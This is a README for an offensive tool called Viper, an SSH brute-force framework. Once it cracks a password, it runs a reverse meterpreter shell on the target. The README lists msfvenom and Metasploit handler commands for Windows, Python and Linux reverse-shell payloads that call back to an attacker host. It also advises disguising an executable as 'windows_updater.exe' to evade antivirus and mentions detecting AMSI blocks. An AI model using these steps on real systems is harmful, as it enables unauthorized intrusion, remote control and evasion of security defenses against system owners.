Viper V1.2
================
Viper is a SSH Multi-Threaded Brute force Framework

<img src="https://raw.githubusercontent.com/darkseid-security/Viper/main/Screenshots/Screenshot_2023-09-25_14_36_01.png" height="500" width="500">
 
Features
=============
- Multi Threaded using multiprocessing can use a maximum of 5 Threads
- Easy to configure 
- Adjustable Threads
- Visual UI including progress bar
- When password is cracked program will attempt to execute a meterpreter payload
- Built in reverse meterpreter shell for Linux and Windows
- Supports x86,x64 archtechture for Windows and Linux
- [*Updated Feature] Added python/meterpreter/reverse_tcp_ssl
- [*New Feature] Added windows/meterpreter/reverse_tcp 
- [*New Feature] Detects account lockout
- [*New Feature] Detects if AMSI has blocked payload
- [*New Feature] Upload file to server if code execution fails
 

TODO
=========
- Add OS version detection


Payloads
=================

* Windows Meterpreter:
  - generate payload from exploit/multi/script/web_delivery for every metasploit session
  - enable SSL: set SSL true
  - set payload windows/meterpreter/reverse_tcp
  - Select powershell payload: set target 2
  - set LPORT 8443
  - set LHOST
  - run
  - copy payload and replace value of client.exec_command()
  
* Python Meterpreter:
 - generate payload: msfvenom -p payload python/meterpreter/reverse_tcp_ssl lhost=IP lport=4433 -f python -o update.py
 - use exploit/multi/handler
 - set payload python/meterpreter/reverse_tcp_ssl
 - set LPORT 4433
 - set LHOST
 - run -j
 
* Linux Meterpreter:
 - generate payload: msfvenom -p payload linux/x86/meterpreter_reverse_https lhost=IP lport=443 -f elf -o payload.elf
 - use exploit/multi/handler
 - set payload linux/x86/meterpreter_reverse_https
 - set LPORT 443
 - set LHOST
 - run -j

Note
=========
- If threads set to 5 if someone logs in to SSH while brute-forcing program will crash.
- Add own windows executable to /Files/windows_updater.exe to bypass AV and change windows_malware variable to windows_updater.exe.

Run
========
- Generate payloads/files and put in Files folder
- Edit config in Viper.py script to set to target
